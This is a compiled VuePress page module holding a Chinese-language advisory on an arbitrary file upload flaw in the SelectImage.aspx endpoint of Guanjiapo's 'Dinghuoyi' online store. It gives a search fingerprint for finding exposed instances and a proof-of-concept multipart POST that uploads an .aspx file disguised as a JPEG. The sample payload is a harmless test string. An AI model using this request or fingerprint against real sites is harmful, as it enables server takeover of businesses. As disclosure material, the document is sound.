import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>任我行率先针对中小企业推出了管家婆进销存、财务一体化软件。</p><p>管家婆订货易在线商城存在 SelectImage.aspx 任意文件上传漏洞，攻击者可通过该漏洞可控制整个系统，最终导致系统处于极度不安全状态。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>管家婆 订货易在线商城</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;订货易&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231115102159123.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>poc</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /DialogTemplates/SelectImage.aspx?type=titleimg&amp;size=30*100&amp;pageindex=1&amp;iscallback=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b

--532c7611457d40f4ae4cd9422973416b
Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;TEST.aspx&quot;
Content-Type: image/jpeg

&lt;% Response.Write(&quot;Test&quot;); %&gt;
--532c7611457d40f4ae4cd9422973416b--&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231115102227428-17000150119182.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13),s=[d];function l(c,r){return a(),i("div",null,s)}const m=e(t,[["render",l],["__file","任我行 管家婆 订货易在线商城 SelectImage.aspx 任意文件上传漏洞.html.vue"]]);export{m as default};
